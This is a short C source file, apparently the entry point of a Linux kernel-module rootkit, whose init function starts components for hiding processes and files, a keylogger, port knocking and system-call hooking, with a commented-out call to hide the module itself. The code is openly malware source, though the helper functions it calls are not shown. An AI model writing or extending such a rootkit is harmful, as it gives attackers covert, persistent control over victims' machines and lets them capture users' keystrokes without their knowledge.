#include "main.h"

static int __init lkm_rootkit_init(void)
{
    printk(KERN_INFO "Hello, World!\n");

    if (proc_init() || hidefs_init() || keylogger_init() || port_knocking_init() || sys_call_init())
    {
        proc_clean();
        hidefs_clean();
        return -1;
    }

    // module_hide();

    return 0;
}

static void __exit lmk_rootkit_exit(void)
{
    proc_clean();
    hidefs_clean();
    keylogger_clean();
    port_knocking_clean();
    sys_call_clean();

    printk(KERN_INFO "Goodbye, World!\n");
}
